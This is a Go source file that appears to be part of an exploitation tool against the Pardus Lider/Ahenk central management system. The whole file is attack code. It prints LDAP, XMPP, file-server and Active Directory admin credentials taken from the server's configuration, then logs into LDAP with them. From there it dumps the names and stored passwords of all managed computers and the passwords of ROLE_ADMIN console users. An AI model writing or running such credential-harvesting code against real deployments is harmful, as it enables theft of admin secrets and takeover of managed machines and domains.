package main

import (
	"fmt"
	"time"

	"github.com/fatih/color"
	"github.com/go-ldap/ldap/v3"
)

type LiderAhenkConfig struct {
	LdapConn *ldap.Conn
	LiderLocale                         string      `json:"liderLocale"`
	LdapServer                          string      `json:"ldapServer"`
	LdapPort                            string      `json:"ldapPort"`
	LdapUsername                        string      `json:"ldapUsername"`
	LdapPassword                        string      `json:"ldapPassword"`
	LdapRootDn                          string      `json:"ldapRootDn"`
	LdapUseSsl                          bool        `json:"ldapUseSsl"`
	LdapSearchAttributes                string      `json:"ldapSearchAttributes"`
	LdapAllowSelfSignedCert             bool        `json:"ldapAllowSelfSignedCert"`
	LdapMailNotifierAttributes          string      `json:"ldapMailNotifierAttributes"`
	LdapEmailAttribute                  string      `json:"ldapEmailAttribute"`
	AgentLdapBaseDn                     string      `json:"agentLdapBaseDn"`
	AgentLdapIDAttribute                string      `json:"agentLdapIdAttribute"`
	AgentLdapJidAttribute               string      `json:"agentLdapJidAttribute"`
	AgentLdapObjectClasses              string      `json:"agentLdapObjectClasses"`
	UserLdapBaseDn                      string      `json:"userLdapBaseDn"`
	UserLdapUIDAttribute                string      `json:"userLdapUidAttribute"`
	UserLdapPrivilegeAttribute          string      `json:"userLdapPrivilegeAttribute"`
	UserLdapObjectClasses               string      `json:"userLdapObjectClasses"`
	UserAuthorizationEnabled            bool        `json:"userAuthorizationEnabled"`
	GroupLdapObjectClasses              string      `json:"groupLdapObjectClasses"`
	RoleLdapObjectClasses               string      `json:"roleLdapObjectClasses"`
	UserLdapRolesDn                     string      `json:"userLdapRolesDn"`
	GroupLdapBaseDn                     string      `json:"groupLdapBaseDn"`
	UserGroupLdapBaseDn                 string      `json:"userGroupLdapBaseDn"`
	AhenkGroupLdapBaseDn                string      `json:"ahenkGroupLdapBaseDn"`
	XMPPHost                            string      `json:"xmppHost"`
	XMPPPort                            int         `json:"xmppPort"`
	XMPPUsername                        string      `json:"xmppUsername"`
	XMPPPassword                        string      `json:"xmppPassword"`
	XMPPResource                        string      `json:"xmppResource"`
	XMPPServiceName                     string      `json:"xmppServiceName"`
	XMPPMaxRetryConnectionCount         int         `json:"xmppMaxRetryConnectionCount"`
	XMPPPacketReplayTimeout             int         `json:"xmppPacketReplayTimeout"`
	XMPPPingTimeout                     int         `json:"xmppPingTimeout"`
	XMPPUseSsl                          bool        `json:"xmppUseSsl"`
	XMPPAllowSelfSignedCert             bool        `json:"xmppAllowSelfSignedCert"`
	XMPPUseCustomSsl                    bool        `json:"xmppUseCustomSsl"`
	XMPPPresencePriority                int         `json:"xmppPresencePriority"`
	FileServerProtocol                  string      `json:"fileServerProtocol"`
	FileServerHost                      string      `json:"fileServerHost"`
	FileServerUsername                  string      `json:"fileServerUsername"`
	FileServerPassword                  string      `json:"fileServerPassword"`
	FileServerPluginPath                string      `json:"fileServerPluginPath"`
	FileServerAgreementPath             string      `json:"fileServerAgreementPath"`
	FileServerAgentFilePath             string      `json:"fileServerAgentFilePath"`
	FileServerURL                       interface{} `json:"fileServerUrl"`
	FileServerPort                      int         `json:"fileServerPort"`
	TaskManagerCheckFutureTask          interface{} `json:"taskManagerCheckFutureTask"`
	TaskManagerFutureTaskCheckPeriod    interface{} `json:"taskManagerFutureTaskCheckPeriod"`
	AlarmCheckReport                    interface{} `json:"alarmCheckReport"`
	MailAddress                         interface{} `json:"mailAddress"`
	MailPassword                        interface{} `json:"mailPassword"`
	MailHost                            interface{} `json:"mailHost"`
	MailSMTPPort                        interface{} `json:"mailSmtpPort"`
	MailSMTPAuth                        interface{} `json:"mailSmtpAuth"`
	MailSMTPStartTLSEnable              interface{} `json:"mailSmtpStartTlsEnable"`
	MailSMTPSslEnable                   interface{} `json:"mailSmtpSslEnable"`
	MailSMTPConnTimeout                 interface{} `json:"mailSmtpConnTimeout"`
	MailSMTPTimeout                     interface{} `json:"mailSmtpTimeout"`
	MailSMTPWriteTimeout                interface{} `json:"mailSmtpWriteTimeout"`
	MailSendOnTaskCompletion            interface{} `json:"mailSendOnTaskCompletion"`
	MailCheckTaskCompletionPeriod       interface{} `json:"mailCheckTaskCompletionPeriod"`
	MailSendOnPolicyCompletion          interface{} `json:"mailSendOnPolicyCompletion"`
	MailCheckPolicyCompletionPeriod     interface{} `json:"mailCheckPolicyCompletionPeriod"`
	HotDeploymentPath                   interface{} `json:"hotDeploymentPath"`
	CronTaskList                        interface{} `json:"cronTaskList"`
	EntrySizeLimit                      interface{} `json:"entrySizeLimit"`
	CronIntervalEntrySize               interface{} `json:"cronIntervalEntrySize"`
	AdDomainName                        string      `json:"adDomainName"`
	AdHostName                          string      `json:"adHostName"`
	AdIPAddress                         string      `json:"adIpAddress"`
	AdAdminUserName                     string      `json:"adAdminUserName"`
	AdAdminUserFullDN                   string      `json:"adAdminUserFullDN"`
	AdAdminPassword                     string      `json:"adAdminPassword"`
	AdPort                              string      `json:"adPort"`
	AdUseSSL                            bool        `json:"adUseSSL"`
	AdUseTLS                            bool        `json:"adUseTLS"`
	AdAllowSelfSignedCert               bool        `json:"adAllowSelfSignedCert"`
	AllowDynamicDNSUpdate               bool        `json:"allowDynamicDNSUpdate"`
	DisableLocalUser                    bool        `json:"disableLocalUser"`
	DomainType                          string      `json:"domainType"`
	AhenkRepoAddress                    string      `json:"ahenkRepoAddress"`
	AhenkRepoKeyAddress                 string      `json:"ahenkRepoKeyAddress"`
	AllowVNCConnectionWithoutPermission bool        `json:"allowVNCConnectionWithoutPermission"`
	PardusRepoAddress                   interface{} `json:"pardusRepoAddress"`
	PardusRepoComponent                 interface{} `json:"pardusRepoComponent"`
}


func (lider *LiderAhenkConfig)PrintCredentials(){
	color.Yellow("------------ Credentials ------------")
	color.Yellow("LdapUsername : %s", lider.LdapUsername)
	color.Yellow("LdapPassword : %s", lider.LdapPassword)
	color.Yellow("LdapRootDn : %s", lider.LdapRootDn)
	color.Yellow("XmppUsername : %s", lider.XMPPUsername)
	color.Yellow("XmppPassword : %s", lider.XMPPPassword)
	color.Yellow("FileServerProtocol : %s", lider.FileServerProtocol)
	color.Yellow("FileServerUsername : %s", lider.FileServerUsername)
	color.Yellow("FileServerPassword : %s", lider.FileServerPassword)
	color.Yellow("Active Directory Hostname : %s", lider.AdHostName)
	color.Yellow("Active Directory Username : %s", lider.AdAdminUserName)
	color.Yellow("Active Directory Password : %s", lider.AdAdminPassword)
	color.Yellow("-------------------------------------")
}

func (lider *LiderAhenkConfig)CheckLDAPCredentials() {

	print_info("Checking LDAP credentials")

	time.Sleep(1)

	l , err := ldap.Dial("tcp", fmt.Sprintf("%s:%s", lider.LdapServer, lider.LdapPort))

	if err != nil {
		panic_with_msg("Unable to connect to the LDAP service", err)
	}

	if err = l.Bind(lider.LdapUsername, lider.LdapPassword); err != nil{
		panic_with_msg("Failed to auth with LDAP credentials", err)
	}
	print_good("Great ! LDAP credentials are working !")

	lider.LdapConn = l

}

func (l *LiderAhenkConfig)FetchAgentComputers() {
	print_info("Fetching computer names managed via Ahenk service")

	filter := "(objectClass=Device)"

	r, err := l.LdapConn.Search(
		ldap.NewSearchRequest(
			l.AgentLdapBaseDn,
			ldap.ScopeWholeSubtree,
			ldap.NeverDerefAliases,
			0,
			0,
			false,
			filter,
			[]string{},
			nil,
		),
	)

	if err != nil {
		panic_with_msg("Cant find the computers managed via Ahenk.. Weird.", err)
	}

	print_good(fmt.Sprintf(
		"Number of computers managed via Ahenk : %d",
		len(r.Entries),
	))

	color.Magenta("------------ Computer List Managed via AHENK ------------")
	for _, entry := range r.Entries {	
		for _, attr := range entry.Attributes {
			switch attr.Name {
			case "cn":
				color.Magenta("Computer name : %s", attr.Values)
			case "liderDeviceOSType":
				color.Magenta("Computer OS Type : %s", attr.Values)
			case "userPassword":
				color.Magenta("Computer password : %s", attr.Values)
			}
		}
		color.Magenta("\n")
	}	
	color.Magenta("---------------------------------------------------------")
}

func (l *LiderAhenkConfig)FetchLiderConsoleUser() ConsoleUser {

	cu := ConsoleUser{}
	print_info("Fetching accounts with ROLE_ADMIN privileges")

	filter := "(&(objectClass=pardusAccount)(liderPrivilege=ROLE_ADMIN))"

	r, err := l.LdapConn.Search(
		ldap.NewSearchRequest(
			l.LdapRootDn,
			ldap.ScopeWholeSubtree,
			ldap.NeverDerefAliases,
			0,
			0,
			false,
			filter,
			[]string{},
			nil,
		),
	)

	if err != nil {
		panic_with_msg("Cant find the Users with ROLE_ADMIN privileges.. Weird.", err)
	}

	print_good(fmt.Sprintf(
		"Number of user with high privileges : %d",
		len(r.Entries),
	))

	color.Yellow("------------ LDAP Users With ROLE_ADMIN Privileges ------------")


	for _, entry := range r.Entries {	
		for _, attr := range entry.Attributes {
			switch attr.Name {
			case "cn":
				cu.username = attr.Values
				color.Yellow("Username : %s", attr.Values)
			case "userPassword":
				cu.password = attr.Values
				color.Yellow("Password : %s", attr.Values)
			}
		}
	color.Yellow("----------------------------------------------------------------")
		
	}
	return cu
}